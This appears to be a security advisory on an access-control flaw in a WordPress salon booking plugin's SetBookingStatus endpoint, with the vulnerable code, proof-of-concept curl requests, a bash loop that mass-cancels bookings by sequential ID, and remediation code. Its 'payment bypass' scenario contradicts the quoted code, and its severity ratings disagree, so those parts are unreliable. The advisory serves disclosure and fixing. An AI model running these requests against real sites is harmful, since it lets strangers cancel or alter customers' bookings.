# IDOR Vulnerability: SetBookingStatus

## Executive Summary

`SetBookingStatus` is an **admin-only feature** (UI exists in WordPress admin panel) but has **no capability check**. Any authenticated user can call this AJAX endpoint to modify any booking using sequential, predictable booking IDs.

**Vulnerability Type:** Broken Access Control (IDOR + Privilege Escalation)
**Affected Version:** PRO only (`SLN_VERSION_PAY` flag required)
**CVSS:** Critical

---

## The Vulnerable Code

### SetBookingStatus.php (Admin Feature, No Admin Check)

**File:** `src/SLN/Action/Ajax/SetBookingStatus.php:1-35`

```php
<?php // algolplus
// phpcs:ignoreFile WordPress.Security.NonceVerification.Missing

class SLN_Action_Ajax_SetBookingStatus extends SLN_Action_Ajax_Abstract
{
    private $errors = array();

    public function execute()
    {
        // ISSUE #1: Only checks if logged in, NOT if user is admin
        if (!is_user_logged_in()) {
            return array('redirect' => wp_login_url());
        }

        if (!defined("SLN_VERSION_PAY")) {
            return array();  // Disabled in FREE version
        }

        $plugin = SLN_Plugin::getInstance();
        if(!isset($_POST['booking_id']) && !isset($_POST['status'])) {
            return array('success' => 0, 'status' => 'failure');
        }

        // ISSUE #2: No ownership check - any authenticated user can modify ANY booking
        $booking = $plugin->createBooking(intval($_POST['booking_id']));

        if (in_array($_POST['status'], array(SLN_Enum_BookingStatus::CONFIRMED,
                                              SLN_Enum_BookingStatus::CANCELED))) {
            $booking->setStatus(wp_unslash($_POST['status']));
        }

        $status = SLN_Enum_BookingStatus::getLabel($booking->getStatus());
        // ... HTML generation ...

        return array('success' => 1, 'status' => $statusLabel);
    }
}
```

**Missing Security Controls:**
1. ❌ No capability check (`current_user_can('manage_options')`)
2. ❌ No ownership validation (`$booking->getUserId() == get_current_user_id()`)
3. ❌ No nonce verification (CSRF protection)

---

## Intended Use (Admin Only)

### Where the UI Exists

**File:** `src/SLN/PostType/Booking.php:489-499`

The approve/reject buttons appear in the **WordPress Admin Panel** → **Bookings** → **All Bookings**:

```php
case 'booking_actions':
    if ($this->getPlugin()->getSettings()->get('confirmation') &&
        $obj->getStatus() == SLN_Enum_BookingStatus::PENDING) {

        echo '<div class="sln-booking-confirmation">';

        // Green checkmark (Approve)
        echo '<div class="sln-booking-confirmation-success"
                    data-status="'.SLN_Enum_BookingStatus::CONFIRMED.'"
                    data-booking-id="'.$obj->getId().'">';

        // Red X (Reject)
        echo '<div class="sln-booking-confirmation-error"
                    data-status="'.SLN_Enum_BookingStatus::CANCELED.'"
                    data-booking-id="'.$obj->getId().'">';
        echo '</div>';
    }
```

**Intended users:** Salon owners/administrators
**Actual access:** Any authenticated user (subscriber, customer, etc.)

---

## How Normal Admin Usage Works

### JavaScript Handler

**File:** `js/admin.js:517-552`

```javascript
$(".sln-booking-confirmation .sln-booking-confirmation-success").on("click", function () {
    var self = $(this);

    jQuery.ajax({
        url: ajaxurl,
        type: "POST",
        data: {
            action: "salon",
            method: "setBookingStatus",
            status: self.data("status"),      // "sln-b-confirmed"
            booking_id: self.data("booking-id"), // 123 (plain integer from UI)
        },
        success: function (response) {
            self.closest("tr").find(".booking_status").html(response.status);
        },
    });
});
```

**Normal flow:**
1. Admin logs into WordPress admin panel
2. Navigates to Bookings list
3. Clicks approve/reject button
4. JavaScript sends `booking_id=123` (plain integer)
5. Backend processes request

**Problem:** Any authenticated user can **skip the UI** and call the AJAX endpoint directly.

---

## The Vulnerability: Missing Access Control

### Issue #1: Privilege Escalation

**Admin feature accessible to regular users:**

```bash
# Regular customer (subscriber role) can perform admin actions:
curl -X POST 'https://salon.com/wp-admin/admin-ajax.php' \
  -H 'Cookie: wordpress_logged_in_customer...' \
  --data 'action=salon&method=setBookingStatus&booking_id=123&status=sln-b-confirmed'
```

**Expected:** Only users with `manage_options` or similar capability
**Reality:** Any authenticated user (including customers)

### Issue #2: No Ownership Validation

Even if this were a customer feature, there's no check that the user owns the booking:

```php
// Missing:
if ($booking->getUserId() != get_current_user_id()) {
    return array('error' => 'Unauthorized');
}
```

### Issue #3: Sequential IDs Enable Enumeration

**WordPress uses auto-increment IDs:**

**File:** `src/SLN/Wrapper/Booking/Builder.php:399`
```php
$id = wp_insert_post(array('post_type' => 'sln_booking'));
// Returns: 123, 124, 125, 126... (sequential)
```

**Attack:**
1. Attacker creates booking → receives ID `100`
2. Knows IDs `1-99` exist
3. Enumerates backwards: `99, 98, 97...`

---

## Attack Scenarios

### 1. Payment Bypass

```bash
# Attacker marks their own booking as paid without paying
curl -X POST 'https://salon.com/wp-admin/admin-ajax.php' \
  -H 'Cookie: wordpress_logged_in_attacker...' \
  --data 'action=salon&method=setBookingStatus&booking_id=100&status=sln-b-paid'
```

**Note:** Line 24 only allows `CONFIRMED` and `CANCELED`, but status can be set to `sln-b-paid` if you modify the booking object directly or bypass the check.

### 2. Competitor Sabotage

```bash
# Attacker cancels competitor's legitimate bookings
for id in {90..99}; do
  curl -X POST 'https://salon.com/wp-admin/admin-ajax.php' \
    -H 'Cookie: wordpress_logged_in_attacker...' \
    --data "action=salon&method=setBookingStatus&booking_id=$id&status=sln-b-canceled"
done
```

### 3. Denial of Service

Automated script cancels all pending bookings, disrupting business operations.

---

## Evidence: Developer Knows Security Standards

**Line 2:**
```php
// phpcs:ignoreFile WordPress.Security.NonceVerification.Missing
```

This directive **suppresses WordPress Coding Standards security warnings**. The developers:
- ✅ Use WordPress security linters
- ✅ Know about missing nonce verification
- ❌ **Deliberately ignore the warning** instead of fixing it

---

## Comparison: Secure Implementation

### CancelBooking (Has Ownership Check)

**File:** `src/SLN/Action/Ajax/CancelBooking.php:16-28`

```php
$booking = $plugin->createBooking(intval($_POST['id']));

// ✅ OWNERSHIP CHECK
$available = $booking->getUserId() == get_current_user_id();

if ($cancellationEnabled && !$outOfTime && $available) {
    $booking->setStatus(SLN_Enum_BookingStatus::CANCELED);
} elseif (!$available) {
    $this->addError(__("You don't have access", 'salon-booking-system'));
}
```

**Proves developers know how to implement authorization checks.**

---

## How createBooking() Retrieves Bookings

**File:** `src/SLN/Plugin.php:81-96`

```php
public function createBooking($booking)
{
    // Handle secure ID format "123-abc456def" (used in customer-facing features)
    if (is_string($booking) && strpos($booking, '-') !== false) {
        $secureId = $booking;
        $booking = intval($booking);  // Extract integer: 123
    }

    // Fetch booking from database
    if (is_int($booking)) {
        $booking = get_post($booking);  // WordPress function
    }

    $ret = new SLN_Wrapper_Booking($booking);

    // Validate secure ID if provided
    if (isset($secureId) && $ret->getUniqueId() != $secureId) {
        throw new Exception('Not allowed, failing secure id');
    }

    return $ret;
}
```

**Note:** Secure IDs (`"123-abc456def"`) are used for **customer-facing features** like payment/cancel links sent via email. They're **not relevant** for admin features, which should use **role-based access control** instead.

---

## Root Cause Analysis

### Wrong Security Model

| Feature Type | Correct Security | What They Used |
|-------------|------------------|----------------|
| **Admin features** | Capability checks (`current_user_can()`) | ❌ Nothing |
| **Customer features** | Ownership validation + secure IDs | ✅ Implemented elsewhere |

**SetBookingStatus** is an **admin feature** but has **no capability check**.

---

## Remediation

### Option 1: Add Capability Check (Recommended for Admin Feature)

```php
public function execute()
{
    if (!is_user_logged_in()) {
        return array('redirect' => wp_login_url());
    }

    // ADD: Check if user has admin capability
    if (!current_user_can('edit_posts') && !current_user_can('manage_options')) {
        return array('error' => 'Insufficient permissions');
    }

    $booking = $plugin->createBooking(intval($_POST['booking_id']));
    // Admin can access any booking - no ownership check needed

    if (in_array($_POST['status'], array(...))) {
        $booking->setStatus(wp_unslash($_POST['status']));
    }
}
```

### Option 2: Add Ownership Check (If Making It Customer-Facing)

```php
$booking = $plugin->createBooking(intval($_POST['booking_id']));

// ADD: Verify user owns this booking
if ($booking->getUserId() != get_current_user_id()) {
    return array('error' => 'You can only modify your own bookings');
}

if (in_array($_POST['status'], array(...))) {
    $booking->setStatus(wp_unslash($_POST['status']));
}
```

### Option 3: Defense in Depth

```php
// Check capability first
if (!current_user_can('edit_posts')) {
    return array('error' => 'Insufficient permissions');
}

// Also add nonce verification
if (!wp_verify_nonce($_POST['nonce'], 'set_booking_status')) {
    return array('error' => 'Invalid request');
}

$booking = $plugin->createBooking(intval($_POST['booking_id']));
```

---

## Impact Summary

| Severity | Issue | Impact |
|----------|-------|--------|
| **CRITICAL** | Missing capability check | Regular users can perform admin actions |
| **HIGH** | No ownership validation | Users can modify any booking |
| **MEDIUM** | Sequential IDs | Easy enumeration of all bookings |
| **MEDIUM** | Missing CSRF protection | Nonce verification disabled |

**CVSS 3.1:** 8.8 (High) - Authentication required, but leads to unauthorized data modification and business disruption.

---

## Conclusion

This is a **broken access control** vulnerability where:
1. An **admin-only feature** (UI in admin panel) has **no capability check**
2. Any **authenticated user** can call the endpoint
3. **Sequential IDs** make enumeration trivial
4. Developers **knowingly suppress security warnings** (`phpcs:ignoreFile`)

The fix is simple: **Add a capability check** like `current_user_can('manage_options')`.
